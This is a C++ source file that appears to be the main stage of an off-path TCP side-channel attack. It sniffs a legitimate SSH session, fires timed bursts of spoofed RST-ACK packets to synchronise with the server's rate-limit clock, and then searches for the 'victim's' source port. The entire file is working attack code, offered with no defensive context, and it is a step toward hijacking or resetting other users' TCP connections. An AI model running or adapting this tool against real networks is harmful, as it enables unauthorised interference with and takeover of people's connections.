#include <chrono>
#include <iostream>
#include <tins/tins.h>
#include <thread>

#include "common.h"
#include "packet_counter.h"
#include "port_finder.h"

using namespace std;
using namespace std::chrono_literals;

// Inital number of legit SSH packets to trigger sniffer
const int kInitPacketCount = 10;
const uint32_t kInitPacketWaitSec = 2;

void printHeader(const std::string msg) {
    for (auto i = 0u; i < msg.size() + 4; i++) {
        cout << "=";
    }
    cout << endl << "  " << msg << endl;
    for (auto i = 0u; i < msg.size() + 4; i++) {
        cout << "=";
    }
    cout << endl;
}

pair<ConnectionID, uint32_t> waitAndGetLegitConnectionInfo(
        const string& serverIP, int serverPort) {
    Tins::Sniffer sniffer(kNetworkInterface);
    sniffer.set_filter(
      "dst host " + serverIP + " and dst port " + to_string(serverPort));
    sniffer.set_pcap_sniffing_method(pcap_dispatch);
    sniffer.set_timeout(kInitPacketWaitSec);
    int packetCount = kInitPacketCount;
    while (packetCount > 0) {
        sniffer.next_packet();
        packetCount--;
    }

    cout << "Got " << kInitPacketCount 
         << " initial packets. Sniffing for more until silent for "
         << kInitPacketWaitSec << " sec" << endl;

    uint32_t lastSeq = 0;
    ConnectionID connection;
    while (has_packet(sniffer, kInitPacketWaitSec)) {
        auto pdu = sniffer.next_packet().pdu();
        const Tins::IP &ip = pdu->rfind_pdu<Tins::IP>();
        const Tins::TCP &tcp = pdu->rfind_pdu<Tins::TCP>();
        connection = ConnectionID(ip.src_addr(), tcp.sport(), ip.dst_addr(), tcp.dport()); 
        lastSeq = max(lastSeq, tcp.seq());
    }
    return make_pair(connection, lastSeq);
}

milliseconds synchronizeClock(const ConnectionID& legitConn, int legitLastSeq) {
    Tins::PacketSender sender;
    
    auto pkt = make_packet(legitConn, "RA", legitLastSeq + 3);    
    auto pcounter = PacketCounter::instance();

    uint32_t n1, n2;
    {
        cout << "Sending out 200 packets in 1 sec..." << endl;
        pcounter->startCounting();
        auto s = align_and_delay(0ms);
        for (int i = 0; i < 200; i++) {
            sender.send(pkt);
            s += 5ms;
            this_thread::sleep_until(system_clock::time_point(s));
        }
        this_thread::sleep_for(2s);
        n1 = pcounter->stopCounting();
        cout << "n1 = " << n1 << endl;
    }

    {
        cout << "Sending out 200 packets in 1 sec and 5ms delay..." << endl;
        pcounter->startCounting();
        auto s = align_and_delay(5ms);
        for (int i = 0; i < 200; i++) {
            sender.send(pkt);
            s += 5ms;
            this_thread::sleep_until(system_clock::time_point(s));
        }
        this_thread::sleep_for(2s);
        n2 = pcounter->stopCounting();
        cout << "n2 = " << n2 << endl;
    }

    uint32_t delay_ms = 0;
    if (n1 == 100) {
        delay_ms = 0;
    } else if (n2 == 100) {
        delay_ms = 5;
    } else if (n1 > n2) {
        delay_ms = 5 + (n2 - 100) * 1000 / 200;
    } else {
        delay_ms = 5 + (300 - n2) * 1000 / 200;
    }
    return milliseconds(delay_ms);
}

void testClock(const ConnectionID& legitConn, int legitLastSeq, milliseconds delayMs) {
    auto pcounter = PacketCounter::instance();
    Tins::PacketSender sender;
    auto pkt = make_packet(legitConn, "RA", legitLastSeq + 3);
    for (int c = 0; c < 5; c++) {
        pcounter->startCounting();
        auto s = align_and_delay(delayMs);
        int packets = 200;
        for (int i = 0; i < packets; i++) {
            sender.send(pkt);
            s += 5ms;
            this_thread::sleep_until(system_clock::time_point(s));
        }
        this_thread::sleep_for(2s);

        auto result = pcounter->stopCounting();
        cout << "Delay until: " << s.count() << "ms. ";
        cout << " Sent: " << packets << " packets. Received: " << result << " packets" << endl;
    }
}

int main() {
    printHeader("WAITING FOR THE LEGIT CONNECTION...");
    auto legitInfo = waitAndGetLegitConnectionInfo(kServerIP, kServerPort);
    auto legitConn = legitInfo.first;
    auto legitLastSeq = legitInfo.second;
    cout << "Got legit connection info: " << legitConn.toString() << " " << legitLastSeq << endl;

    printHeader("SYNCHRONIZING CLOCK...");
    auto syncDelayMs = synchronizeClock(legitConn, legitLastSeq);
    cout << "Synchronization delay: " << syncDelayMs.count() << "ms" << endl;

    printHeader("FINDING VICTIM'S PORT...");
    PortFinder portFinder(legitConn, legitLastSeq, "192.168.1.103");
    portFinder.setSyncDelayMs(syncDelayMs);
    try {
        auto victimPort = portFinder.find(32000, 38000);
        cout << "Victim's port: " << victimPort << endl;
    } catch (char const* err) {
        cout << "Error: " << err << endl;
        return 1;
    }
    return 0;
}